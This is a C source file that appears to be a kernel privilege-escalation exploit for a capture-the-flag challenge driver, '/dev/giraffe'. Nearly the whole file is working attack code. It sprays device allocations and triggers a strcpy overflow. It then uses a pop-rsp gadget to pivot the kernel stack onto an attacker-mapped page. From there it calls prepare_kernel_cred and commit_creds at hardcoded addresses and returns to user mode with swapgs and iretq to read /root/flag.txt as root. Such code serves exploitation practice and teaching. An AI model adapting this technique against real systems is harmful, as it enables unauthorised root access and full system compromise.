#include <stddef.h>
#define _GNU_SOURCE
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <fcntl.h>

// commands
#define DEV_PATH "" // the path the device is placed

// constants
#define PAGE 0x1000
#define FAULT_ADDR 0xdead0000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4 * PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
// (END constants)

// globals
// (END globals)

#define WAIT getc(stdin);
#define ulong unsigned long

#define errExit(msg)                                                           \
    do {                                                                       \
        perror(msg);                                                           \
        exit(EXIT_FAILURE);                                                    \
    } while (0)
#define KMALLOC(qid, msgbuf, N)                                                \
    for (int ix = 0; ix != N; ++ix) {                                          \
        if (msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1)        \
            errExit("KMALLOC");                                                \
    }

static void print_hex8(char *buf, size_t len) {
    uint64_t *tmp = (uint64_t *)buf;

    for (int i = 0; i < (len / 8); i++) {
        printf("%p ", tmp[i]);
        if ((i + 1) % 2 == 0) {
            printf("\n");
        }
    }

    printf("\n");
}

struct pt_regs {
    ulong r15;
    ulong r14;
    ulong r13;
    ulong r12;
    ulong bp;
    ulong bx;
    ulong r11;
    ulong r10;
    ulong r9;
    ulong r8;
    ulong ax;
    ulong cx;
    ulong dx;
    ulong si;
    ulong di;
    ulong orig_ax;
    ulong ip;
    ulong cs;
    ulong flags;
    ulong sp;
    ulong ss;
};

static void print_regs(struct pt_regs *regs) {
    printf("r15: %lx r14: %lx r13: %lx r12: %lx\n", regs->r15, regs->r14,
           regs->r13, regs->r12);
    printf("bp: %lx bx: %lx r11: %lx r10: %lx\n", regs->bp, regs->bx, regs->r11,
           regs->r10);
    printf("r9: %lx r8: %lx ax: %lx cx: %lx\n", regs->r9, regs->r8, regs->ax,
           regs->cx);
    printf("dx: %lx si: %lx di: %lx ip: %lx\n", regs->dx, regs->si, regs->di,
           regs->ip);
    printf("cs: %lx flags: %lx sp: %lx ss: %lx\n", regs->cs, regs->flags,
           regs->sp, regs->ss);
}

int64_t user_cs, user_ss, user_rflags, user_sp;
static void save_state() {
    __asm__(".intel_syntax noprefix;"
            "mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            ".att_syntax;");
}

int dev_read(int fd, uint8_t* buf, size_t sz) {
    if (read(fd, buf, sz) < 0) {
        errExit("read");
    }
}

int dev_write(int fd, uint8_t* buf, size_t sz) {
    if (write(fd, buf, sz) < 0) {
        errExit("write");
    }
}

int open_dev(void) {
    int fd = open("/dev/giraffe", O_RDWR);
    if (fd < 0) {
        errExit("open");
    }

    return fd;
}

char flag[0x40] = {0};
void get_flag(void)
{
    puts("Get flag");
    //system("cat /root/flag.txt");
    int fd = open("/root/flag.txt", O_RDONLY);
    read(fd, flag, sizeof(flag));

    write(0, flag, sizeof(flag));
}
uint64_t user_rip = (uint64_t)get_flag;

void exploit(void)
{
    uint64_t prepare_kernel_cred = 0xffffffff8109f820;
    uint64_t commit_creds = 0xffffffff8109f550;
    uint64_t init_task = 0xffffffff81e0a540;
    __asm__(
        ".intel_syntax noprefix;"
        // prepare_cred
        "movabs rax, 0xffffffff8109f820;"
        // init task
        "movabs rdi, 0xffffffff81e0a540;"
        "call rax;"
        "mov rdi, rax;"
        // commit_creds
        "movabs rax, 0xffffffff8109f550;"
        "call rax;"
        "swapgs;"
        "mov r15, user_ss;"
        "push r15;"
        "mov r15, user_sp;"
        "push r15;"
        "mov r15, user_rflags;"
        "push r15;"
        "mov r15, user_cs;"
        "push r15;"
        "mov r15, user_rip;"
        "push r15;"
        "iretq;"
        ".att_syntax;"
    );
}

// slab_nomerge = disable merging of slabs with similar size
// => different objects of the same size **wont** share a cache
uint64_t pop_rsp_ret = 0xffffffff81122813;
uint64_t ret = 0xffffffff81122814;

void setup_stack(void) {
    char* stack = mmap((void*)0xdead000, 0x2000, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_PRIVATE |  MAP_ANONYMOUS | MAP_FIXED, 0, 0);
    uint64_t* p_stack = (uint64_t*)stack;

    if (stack == MAP_FAILED) {
        errExit("mmap");
    }

    size_t off = 0xff0/8;

    p_stack[off++] = ret;
    p_stack[off++] = (uint64_t)exploit;
}


// break *0xffffffffc0000104
int main(void) {
    setup_stack();

    int fds[0x400];
    uint8_t buf[0x100] = {0};
    uint64_t* p_buf = (uint64_t*)buf;

    p_buf[0] = 0x4141414141414141;
    p_buf[1] = 0x4242424242424242;
    p_buf[2] = 0x4343434343434343;
    p_buf[3] = 0x0102030405060708;

    // addresses are shifted by 1 byte due to BUF_SIZE+1
    memcpy(buf+0x11, &pop_rsp_ret, 0x8);
    uint64_t rsp = 0xdeadff0;
    memcpy(buf+0x19, &rsp, 0x8);

    for (size_t i = 0x20; i < 0x200; ++i) {
        fds[i] = open_dev();
        dev_write(fds[i], buf, 0x20);
    }

    memset(buf, 0x44, sizeof(buf));

    for (size_t i = 0; i < 0x20; ++i) {
        fds[i] = open_dev();
        dev_write(fds[i], buf, 0x20);
    }

    // close all devices, clearing the null byte that strcpy wrote
    for (size_t i = 0; i < 0x20; ++i) {
        close(fds[i]);
    }

    save_state();

    // strcpy bof
    for (size_t i = 0x200; i < 0x300; ++i) {
        fds[i] = open_dev();
        dev_read(fds[i], buf, 0x20);
    }

    puts("Done");
    WAIT

    //close(fd);

}
